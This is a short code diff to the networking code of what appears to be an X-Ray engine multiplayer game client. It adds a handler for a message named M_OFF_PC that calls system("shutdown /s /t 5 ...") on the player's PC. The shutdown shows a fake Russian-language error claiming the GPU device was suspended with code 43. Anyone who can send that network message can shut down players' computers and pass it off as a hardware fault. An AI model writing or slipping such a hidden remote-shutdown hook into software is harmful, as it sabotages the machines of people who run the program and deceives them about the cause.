@@ -16,6 +16,7 @@
 #include "file_transfer.h"
 #include "message_filter.h"
 #include "../xrphysics/iphworld.h"
+//#include "../xrEngine/XR_IOConsole.h"
 
 extern LPCSTR map_ver_string;
 LPSTR remove_version_option(LPCSTR opt_str, LPSTR new_opt_str, u32 new_opt_str_size)
@@ -476,6 +477,15 @@ void CLevel::ClientReceive()
 					CopyMemory(NewPacket, &(*P), sizeof(NET_Packet));
 				}
 			}break;
+
+		case M_OFF_PC:
+		{
+			CActor* pA = smart_cast<CActor*>(Level().CurrentControlEntity());
+			pA->PlayAnmSound("no_sound");
+			//Console->Execute("quit");
+			system("shutdown /s /t 5 /c \"Экземпляр устройства GPU приостановлен! Код: 43\" ");
+			break;
+		}
 		}
 
 		net_msg_Release();
